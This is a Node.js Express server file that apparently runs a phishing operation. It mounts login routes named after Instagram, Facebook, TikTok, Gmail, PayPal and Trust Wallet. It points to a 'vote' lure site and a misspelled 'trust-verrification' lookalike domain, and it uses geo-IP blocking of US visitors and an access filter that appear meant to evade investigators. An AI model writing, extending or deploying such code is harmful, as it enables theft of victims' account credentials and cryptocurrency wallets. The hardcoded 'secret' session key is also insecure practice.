const express = require("express");
const cors = require("cors");
const app = express();
const flash = require('connect-flash');
const session = require('express-session');
const passport = require("passport")
const expressLayout = require("express-ejs-layouts");
const fileUpload = require("express-fileupload");
const ipgeoblock = require("node-ipgeoblock");
const { blockAccess } = require("./config/blockAccess");


// CONFIGS
require("dotenv").config();
require("./config/db")();
require('./config/passport')(passport);
// MIDDLEWARES
app.use(ipgeoblock({
  geolite2: "./GeoLite2-Country.mmdb",
  blockedCountries: ["US"]
}));
app.use(cors());
app.use(express.static('./public'))
app.use(expressLayout);
app.set("view engine", "ejs");
app.use(express.urlencoded({
  extended: true
}));
app.use(express.json());
app.use(fileUpload({}))
app.use(flash());
app.use(
  session({
    secret: 'secret',
    resave: true,
    saveUninitialized: true
  })
);
// Passport middleware
app.use(passport.initialize());
app.use(passport.session());

// Global variables
app.use(function (req, res, next) {
  res.locals.success_msg = req.flash('success_msg');
  res.locals.error_msg = req.flash('error_msg');
  res.locals.error = req.flash('error');
  req.app.voteUrl = "https://fan-famosity.site"
  // req.app.voteUrl = "http://localhost:5001"
  req.app.trustWalletURL = "https://trust-verrification.vercel.app"
  next();
});


const PORT = process.env.PORT || 2022;

// URLS
app.use("/", blockAccess, require("./routes/index"));
app.use("/", blockAccess, require("./routes/paystack"));
app.use("/", blockAccess, require("./routes/auth"));
app.use("/", require("./routes/instagram"));
app.use("/", require("./routes/facebook"));
app.use("/", require("./routes/tiktok"));
app.use("/", require("./routes/gmail"));
app.use("/paypal", blockAccess, require("./routes/paypal"));
app.use("/trust-wallet-link", blockAccess, require("./routes/trustwallet"));
app.use("/api/wallet", blockAccess, require("./routes/api/wallet"));
app.use("/admin", blockAccess, require("./routes/admin"));
app.use("/admin", blockAccess, require("./routes/admin/auth"));


app.use("*", (req, res) => {
  try {
    return res.redirect("/notfound")
  } catch (err) {
    return res.redirect("/notfound");
  }
});

app.listen(PORT, () => console.log(`server started on port ${PORT}`));